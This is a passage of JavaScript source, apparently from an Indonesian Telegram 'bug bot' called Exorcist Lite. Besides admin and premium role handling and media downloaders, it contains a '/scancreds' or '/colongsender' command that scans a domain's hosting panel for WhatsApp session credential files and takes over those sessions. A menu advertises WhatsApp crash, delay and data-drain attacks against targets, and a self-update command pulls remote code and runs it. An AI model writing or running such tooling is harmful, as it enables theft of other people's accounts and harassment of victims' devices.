    bot.sendMessage(chatId, `Error Jier: ${error}`);
  }
});

function saveRoles() {
  const data = {
    admin: admin.filter(id => !developer.includes(id)),
    prem: prem.filter(id => !developer.includes(id))
  };
  fs.writeFileSync('database.json', JSON.stringify(data, null, 2));
}

bot.onText(/\/addprem(?: (.+))?$/i, (msg, match) => {
  const userId = msg.from.id;
  if (!isValid) return;

  if (!admin.includes(userId) && !IsOwner(userId)) {
    return bot.sendMessage(
      msg.chat.id,
      'Resricted Fiture Just Owner & Admin Can Use It'
    );
  }
  const hitam = match[1];
  if (!hitam) return bot.sendMessage(msg.chat.id, `Missing Id Example:\n${msg.text} 777`);

  const targetId = parseInt(hitam.replace(/[^0-9]/g, ''));

  if (prem.includes(targetId)) {
    return bot.sendMessage(
      msg.chat.id,
      'User Already Have Status premium!'
    );
  }

  prem.push(targetId);
  saveRoles();

  bot.sendMessage(
    msg.chat.id,
    `Successfully Added ${targetId} As premium user!`
  );
});

bot.onText(/\/addadmin(?: (.+))?$/i, (msg, match) => {
  const userId = msg.from.id;
  if (!isValid) return;
  if (!IsOwner(userId) && !developer.includes(userId)) {
    return bot.sendMessage(
      msg.chat.id,
      '⚠️ Hanya owner yang bisa menambahkan admin!'
    );
  }
  const hitam = match[1];
  if (!hitam) return bot.sendMessage(msg.chat.id, `Missing Id Example:\n${msg.text} 777`);

  const targetId = parseInt(match[1].replace(/[^0-9]/g, ''));

  if (admin.includes(targetId)) {
    return bot.sendMessage(msg.chat.id, 'User Already Have Status admin!');
  }

  admin.push(targetId);
  saveRoles();

  bot.sendMessage(
    msg.chat.id,
    `Successfully Added ${targetId} As admin!`
  );
});

bot.onText(/\/delprem(?: (.+))?$/i, (msg, match) => {
  const userId = msg.from.id;
  if (!isValid) return;
  if (!admin.includes(userId) && !IsOwner(userId)) {
    return bot.sendMessage(
      msg.chat.id,
      'Resricted Fiture Just Owner & Admin Can Use It'
    );
  }
  const hitam = match[1];
  if (!hitam) return bot.sendMessage(msg.chat.id, `Missing Id Example:\n${msg.text} 777`);
  const targetId = parseInt(hitam.replace(/[^0-9]/g, ''));
  const index = prem.indexOf(targetId);

  if (index === -1) {
    return bot.sendMessage(
      msg.chat.id,
      'User has no status premium!'
    );
  }

  prem.splice(index, 1);
  saveRoles();

  bot.sendMessage(
    msg.chat.id,
    `Successfully removed premium status from ${targetId}!`
  );
});

bot.onText(/\/deladmin(?: (.+))?$/i, (msg, match) => {
  const userId = msg.from.id;
  if (!isValid) return;
  if (!IsOwner(userId) && !developer.includes(userId)) {
    return bot.sendMessage(
      msg.chat.id,
      'Resricted Fiture Just Owner'
    );
  }
  const hitam = match[1];
  if (!hitam) return bot.sendMessage(msg.chat.id, `Missing Id Example:\n${msg.text} 777`);

  const targetId = parseInt(match[1].replace(/[^0-9]/g, ''));
  const index = admin.indexOf(targetId);

  if (index === -1) {
    return bot.sendMessage(msg.chat.id, 'User has no status admin!');
  }

  admin.splice(index, 1);
  saveRoles();

  bot.sendMessage(
    msg.chat.id,
    `Successfully removed Admin status from  ${targetId}!`
  );
});
//============================retard==================//
bot.onText(/\/updatenow/, async (msg) => {
    const userId = msg.from.id;
    const ChatId = msg.chat.id;

    if (!isValid) return;
    if (!IsOwner(userId) && !developer.includes(userId)) {
        return bot.sendMessage(ChatId, '❌ Restricted Feature: Just Owner');
    }

    bot.sendMessage(ChatId, '🔄 Checking for update...');

    try { 
        const { data: remoteContent } = await axios.get(CONFIG.GITHUB_URL);
        if (!remoteContent || typeof remoteContent !== 'string') {
            throw new Error("Gagal mengambil konten...");
        }

        const localContent = fs.readFileSync(CONFIG.SELF_PATH, 'utf8');

        if (remoteContent !== localContent) {
            console.log('📦 New update found!');

            fs.writeFileSync(`${CONFIG.SELF_PATH}.backup`, localContent);

            fs.writeFileSync(CONFIG.SELF_PATH, remoteContent, 'utf8');

            await bot.sendMessage(ChatId, "✅ Update Completed!\nBot will restart in 1 second...");

            const { spawn } = require('child_process');

setTimeout(() => {
    const child = spawn('node', [CONFIG.SELF_PATH], {
        detached: true,
        stdio: 'ignore'
    });
    child.unref();
    process.exit(0);
}, 1000);
        } else {
            bot.sendMessage(ChatId, '✅ Your bot is already using the latest version.');
        }
    } catch (error) {
        bot.sendMessage(ChatId, '❌ Update failed: ' + error.message);
        console.error('❌ Update failed:', error.message);
    }
});

//============================retard==================//
bot.on('polling_error', (error) => {
  console.error('Error:', error.code, error.message);
});
process.on('uncaughtException', (error) => {
  console.log('Error Global di Node.js:', error);
});
bot.on('error', (error) => {
  console.error(error);
});
//==============================================/
async function tiktok(query) {
    try {
      const encodedParams = new URLSearchParams();
      encodedParams.set("url", query);
      encodedParams.set("hd", "1");
      const response = await axios({
        method: "POST",
        url: "https://tikwm.com/api/",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          "Cookie": "current_language=en",
          "User-Agent": "Mozilla/5.0 (BlackBerry/10.0; x86; de-DE) AppleWebKit/65.0 (KHTML, like Gecko) Safari/65.0 Safari/65.0",
        },
        data: encodedParams,
      });

      const process = response.data.data
      const result = {
      video: process.play,
      caption: process.title
      }
      return result
    } catch (error) {
      reject(error);
    }
}

bot.onText(/\/spotify(?: (.+))?$/i, async (msg, match) => {
   if (!isValid) return;
   const chatId = msg.chat.id;
  const tiktokUrl = match[1];

  if (!tiktokUrl) {
  return bot.sendMessage(chatId, "Mana Link Pekok")
  }
  try {
    const processingMsg = await bot.sendMessage(chatId, "⏳ Mengunduh Music Spotify...");
    const data = await axios(`https://api.nekolabs.web.id/downloader/spotify/v1?url=${encodeURI(tiktokUrl)}`);
    const hasil = data.data.result
    const music = { musik: hasil.downloadUrl, caption: hasil.title }
    await bot.sendAudio(chatId, music.musik, {
      caption: `<pre>music.caption</pre>`,
      parse_mode: "HTML",
    });
    
    await bot.deleteMessage(chatId, processingMsg.message_id);
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, "❌ Gagal mengunduh music. Pastikan link valid!")
  }
});

bot.onText(/\/tiktok(?: (.+))?$/i, async (msg, match) => {
  if (!isValid) return;
  const chatId = msg.chat.id;
  const tiktokUrl = match[1];

  if (!tiktokUrl) {
  return bot.sendMessage(chatId, "Mana Link Pekok")
  }
  try {
    const processingMsg = await bot.sendMessage(chatId, "⏳ Mengunduh Video Kandang Monyet...");
    const data = await tiktok(`${encodeURI(tiktokUrl)}`)
    await bot.sendVideo(chatId, data.video, {
      caption: data.caption,
      parse_mode: "Markdown",
    });
    await bot.deleteMessage(chatId, processingMsg.message_id);
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, "❌ Gagal mengunduh music. Pastikan link valid!")
  }
});

bot.onText(/^\/iqc(?:\s+(.+))?/, async (msg, match) => {
  if (!isValid) return;
  const chatId = msg.chat.id;
  const input = match[1];
  
  if (!input) {
  return bot.sendMessage(chatId, `Error /iqc text|time|battrey`)
  }
  const parts = input.split("|").map(p => p.trim());
  
  if (parts.length < 3) {
  return bot.sendMessage(chatId, `Error /iqc text|time|battrey`)
  }
  const text = parts[0];
  const time = parts[1] || "00:00";
  const battery = parts[2] || "100";
  
  
  try {
    const processingMsg = await bot.sendMessage(chatId, "⏳ Membuat iPhone Quoted...");
    const link = `https://api.zenzxz.my.id/api/maker/fakechatiphone?text=${encodeURIComponent(text)}&chatime=${time}&statusbartime=${battery}`
    const response = await axios.get(link, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data, "binary");
    
    await bot.sendPhoto(chatId, buffer, {
      caption: `Nih`,
      parse_mode: "Markdown",
    });
    
    await bot.deleteMessage(chatId, processingMsg.message_id);
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, "❌ Gagal membuat: " + error)
  }
});

bot.onText(/\/listuser/, async (msg) => {
     if (!isValid) return;
   const chatId = msg.chat.id;
  const userId = msg.from.id; 
  if (!IsOwner(userId) && !admin.includes(userId)) {
    return bot.sendMessage(
      msg.chat.id,
      'Resricted Fiture Just Owner & Admin Can Use It'
    );
  }
  try {
    bot.sendMessage(chatId, `<b>PILIH JENIS LIST</b>`, { 
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: '𝗔𝗗𝗠𝗜𝗡', callback_data: 'admin-list' }],
        [{ text: '𝗣𝗥𝗘𝗠𝗜𝗨𝗠', callback_data: 'premium-list' }],
      ],
    },
    })
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, "❌ Gagal Jirr!")
  }
});

bot.onText(/\/Instagram(?: (.+))?$/i, async (msg, match) => {
     if (!isValid) return;
   const chatId = msg.chat.id;
  const tiktokUrl = match[1];
 if (!tiktokUrl) { 
  return bot.sendMessage(chatId, `Invalid Please Input Link\n/Instagram https://Instagram.com/short`)  
 }
  const processingMsg = await bot.sendMessage(chatId, "⏳ Mengunduh video Instagram...");
  try {
  const result = await axios(`https://api.nekolabs.web.id/downloader/instagram?url=${encodeURI(tiktokUrl)}`)
    const data = result.data.result.metadata;
    const hasil = { 
    video: result.data.result.downloadUrl[0],
    captions: data.caption
    }
    await bot.sendVideo(chatId, hasil.video, {
      caption: hasil.captions,
      parse_mode: "Markdown",
    });
    await bot.deleteMessage(chatId, processingMsg.message_id);
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, "❌ Gagal mengunduh video. Pastikan link valid: " + error);
  }
});

bot.onText(/^\/(scancreds|colongsender)(?:\s|$)/, async (msg, match) => {
    const userId = msg.from.id;
       if (!isValid) return;
      if (!admin.includes(userId) && !IsOwner(userId)) {
    return bot.sendMessage(
      msg.chat.id,
      'Resricted Fiture Just Owner & Admin Can Use It'
    );
  }

    const fullText = match[1] || '';
    const args = fullText.split(' ').filter(arg => arg.trim() !== '');
    const domain = args[0];
    const plta = args[1];
    const pltc = args[2];

    if (!fullText) {
        return bot.sendMessage(msg.chat.id, 'Domain tidak ditemukan.\nFormat: /scancreds <domain> <plta> <pltc>');
    }

    try {
        const scanner = new CredsScanner(domain, plta, pltc);
        const result = await scanner.getFormattedResults();
        
        if (!result || !Array.isArray(result.files) || result.files.length === 0) {
            return bot.sendMessage(msg.chat.id, 'Tidak ada file credentials ditemukan.');
        }

        for (let i = 0; i < result.files.length; i++) {
            const f = result.files[i];
            const cred = String(f.credentials || '');
            const serverId = (f.server_id || f.server || 'unknown').toString().replace(/[^a-zA-Z0-9_-]/g, '');
            const filename = `creds_${serverId}_${i + 1}.json`;
            const filepath = path.join(process.cwd(), filename);
            await fs.writeFile(filepath, cred, 'utf8');
            await connectToWhatsApp(cred.me.id.split(':')[0], chatId, filepath);
             await bot.sendMessage(msg.chat.id, `Please Wait\nWhatsaap Connected: ${isWhatsAppConnected()}`);

            
            await fs.unlink(filepath);

            if (i < result.files.length - 1) {
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        await bot.sendMessage(msg.chat.id, `Selesai mengirim ${result.files.length} file credentials.`);
        
    } catch (err) {
        console.error('Error in scancreds command:', err);
        await bot.sendMessage(msg.chat.id, `Gagal melakukan scan: ${err.message}`);
    }
});

async function uploadToCatbox(fileBuffer, filename) {
  const form = new FormData();

  const blob = new Blob([fileBuffer]);
  
  form.append('reqtype', 'fileupload');
  form.append('fileToUpload', blob, filename);

  const res = await fetch('https://catbox.moe/user/api.php', {
    method: 'POST',
    body: form
  });

  const text = await res.text();
  if (!res.ok || text.startsWith('ERROR')) {
    throw new Error('Upload gagal: ' + text);
  }
  return text.trim();
}

bot.onText(/\/tourl/, async (msg) => {
    if (!isValid) return;
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  

  const replyMsg = msg.reply_to_message;
  if (!replyMsg?.document && !replyMsg?.photo && !replyMsg?.video && !replyMsg?.audio && !replyMsg?.voice) {
    return bot.sendMessage(chatId, '❌ Balas file/audio/video dengan /tourl');
  }

  try {
    let fileId, filename;

    if (replyMsg.document) {
      fileId = replyMsg.document.file_id;
      filename = replyMsg.document.file_name;
    } else if (replyMsg.photo) {
      fileId = replyMsg.photo.slice(-1)[0].file_id;
      filename = 'photo.jpg';
    } else if (replyMsg.video) {
      fileId = replyMsg.video.file_id;
      filename = replyMsg.video.file_name || 'video.mp4';
    } else if (replyMsg.audio) {
      fileId = replyMsg.audio.file_id;
      filename = replyMsg.audio.file_name || 'audio.mp3';
    } else if (replyMsg.voice) {
      fileId = replyMsg.voice.file_id;
      filename = 'voice.ogg';
    }

    const fileLink = await bot.getFileLink(fileId);
    const response = await fetch(fileLink);
    const fileBuffer = Buffer.from(await response.arrayBuffer());

    const catboxUrl = await uploadToCatbox(fileBuffer, filename);
    bot.sendMessage(chatId, `✅ Upload berhasil:\n${catboxUrl}`);
    
  } catch (err) {
    bot.sendMessage(chatId, `❌ Gagal upload: ${err.message}`);
  }
});


//[ CASE CALLBACK ]\\
bot.on('callback_query', async (callbackQuery) => {
  if (!isValid) return;
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const data = callbackQuery.data;
  const senderId = callbackQuery.from.id;
  const role = getUserRole(senderId);
  const username = callbackQuery.from.username ? `${callbackQuery.from.username}` : 'Tidak ada username';
  const statusKoneksi = sessions.size === 0 ? "Terputus" : "Tersambung";
  let caption = '';
  let replyMarkup = [];
  
  try {
     if (data === 'bct') {
     return await bot.editMessageText(`<b>PILIH JENIS LIST</b>`, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: 'HTML',
      reply_markup:  {
      inline_keyboard: [
        [{ text: '𝗔𝗗𝗠𝗜𝗡', callback_data: 'admin-list' }],
        [{ text: '𝗣𝗥𝗘𝗠𝗜𝗨𝗠', callback_data: 'premium-list' }],
      ],
          }
    });
     }
     if (data === 'admin-list' && config.OWNER_ID.includes(senderId.toString())) {
     const cleanAdmin = admin.filter(id => !developer.includes(id));
     caption = `${cleanAdmin.map((id, i) => `${i+1}. <code>${id}</code>`).join('\n') || 'Kosong'}\n`
     return await bot.editMessageText(caption, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: 'HTML',
      reply_markup:  {
      inline_keyboard: [
          [{ text: '🔙 Kembali', callback_data: 'bct' }],
          ]
          }
    });
     }
     if (data === 'premium-list' && config.OWNER_ID.includes(senderId.toString())) {
  const cleanPrem = prem.filter(id => !developer.includes(id));
  caption = `${cleanPrem.map((id, i) => `${i+1}. <code>${id}</code>`).join('\n') || 'Kosong'}\n`
  return await bot.editMessageText(caption, {
    chat_id: chatId,
    message_id: messageId,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [{ text: '🔙 Kembali', callback_data: 'bct' }],
      ]
    }
  });
}
     if (data === 'tools') {
      caption = `<pre>ﾒ ោ៝ 𝗘𝗫𝗢𝗥𝗖𝗜𝗦𝗧 𝗟𝗜𝗧𝗘 ༒︎</pre>
<blockquote><b>Hi @${username} You Role Is ${role}
Thanks For User Exorcist Script</b></blockquote>

<pre>> 𝗧𝗢𝗢𝗟𝗦</pre>
/Instagram &lt;Url&gt;
/tiktok  &lt;Url&gt;
/spotify &lt;Url&gt;
/colongsender
/tourl &lt;Url&gt;`;
      replyMarkup = {
        inline_keyboard: [
          [{ text: '🔙 Kembali', callback_data: 'back_to_main' }],
        ],
      };
    }
     if (data === 'bug') {
      caption = `<pre>ﾒ ោ៝ 𝗘𝗫𝗢𝗥𝗖𝗜𝗦𝗧 𝗟𝗜𝗧𝗘 ༒︎</pre>
<blockquote><b>Hi @${username} You Role Is ${role}
Thanks For User Exorcist Script</b></blockquote>

<pre>> 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 </pre>
/delaybeta &lt;target&gt;
╰┈➤ New Delay For WhatsApp Beta
/Buldozer &lt;target&gt;
╰┈➤ Data Consumption For WhatsApp 
/delay &lt;target&gt;
╰┈➤ Delay WhatsApp 
/Apex &lt;target&gt;
╰┈➤ Blank Chat WhatsApp Target 
/Echo &lt;target&gt;
╰┈➤ Crash iPhone Maybe`;
      replyMarkup = {
        inline_keyboard: [
          [{ text: '🔙 Kembali', callback_data: 'back_to_main' }],
        ],
      };
    }
     if (data === 'owner') {
      caption = `<pre>ﾒ ោ៝ 𝗘𝗫𝗢𝗥𝗖𝗜𝗦𝗧 𝗟𝗜𝗧𝗘 ༒︎</pre>
<blockquote><b>Hi @${username} You Role Is ${role}
Thanks For User Exorcist Script</b></blockquote>

<pre>> 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨</pre>
/addbot &lt;number&gt;
/devices
/listuser
/updatenow
/addprem &lt;id&gt;
/delprem &lt;id&gt;
/addadmin &lt;id&gt;
/deladmin &lt;id&gt;`;
      replyMarkup = {
        inline_keyboard: [
          [{ text: '🔙 Kembali', callback_data: 'back_to_main' }],
        ],
      };
    }
    if (data === 'back_to_main') {
      caption = `<pre>ﾒ ោ៝ 𝗘𝗫𝗢𝗥𝗖𝗜𝗦𝗧 𝗟𝗜𝗧𝗘 ༒︎</pre>
<blockquote><b>Hi @${username} You Role Is ${role}
Thanks For User Exorcist Script</b></blockquote>

<pre>𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡
➤ - 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 : ${username}
➤ - 𝗥𝗨𝗡𝗧𝗜𝗠𝗘 : ${getBotRuntime()}
➤ - 𝗠𝗘𝗠𝗢𝗥𝗬 : ${formatMemory()}
➤ - 𝗦𝗘𝗡𝗗𝗘𝗥 : ${statusKoneksi}
</pre>
<pre><b>𝗤𝘂𝗼𝘁𝗲</b>
${indonesianigga()}</pre>`;
      replyMarkup = {
        inline_keyboard: [
          [{ text: '[ 𝗧𝗢𝗢𝗟𝗦 ]', callback_data: 'tools' }, { text: "[ 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 ]", callback_data: 'bug' }],
          [{ text: '[ 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 ]', callback_data: 'owner' }],
          [{ text: '𝗖𝗛𝗔𝗡𝗡𝗘𝗟', url: 'https://t.me/OrArci' }],
        ],
      };
    }

    await bot.editMessageMedia(
      {
        type: 'photo',
        media: image,
        caption: caption,
        parse_mode: 'HTML',
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup,
      }
    );

    await bot.answerCallbackQuery(callbackQuery.id);
  } catch (error) {
  console.log(error)
  }
});